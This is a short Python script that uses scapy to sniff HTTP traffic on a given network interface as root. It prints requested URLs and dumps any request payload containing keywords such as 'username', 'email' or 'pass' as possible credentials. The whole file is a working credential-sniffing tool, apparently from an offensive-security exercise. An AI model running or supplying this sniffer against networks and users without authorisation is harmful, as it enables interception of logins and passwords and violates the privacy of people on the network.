#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse
import os

def Sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    #haslayer returns layer in braces
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        info = get_login_info(packet)
        if info:
            print("\n\n[+] Possible username/password > " + info + "\n\n")

def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load   #layers in-btw [], you can do .field_name
            #keywords are going to be in byte format
            keywords = [b"username", b"uname", b"email", b"user", b"login", b"pass", b"id", b"ID", b"role"]
            for key in keywords:
                if key in load:
                    return load.decode("utf-8")

def get_url(packet):
    #url is host and path e.g google.com/earth
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def main():
    parser = argparse.ArgumentParser(description="select an interface to sniff")
    parser.add_argument("-i", "--interface", dest="interface", help="provide an interface to sniff packet")
    args = parser.parse_args()
    if not args.interface:
        parser.error("[-] Error: interface not specified, use --help for usage")
    Sniff(args.interface)

if __name__ == "__main__":
    if os.getuid() == 0:
        main()
    else:
        print("[=] Run Program as Superuser (root).")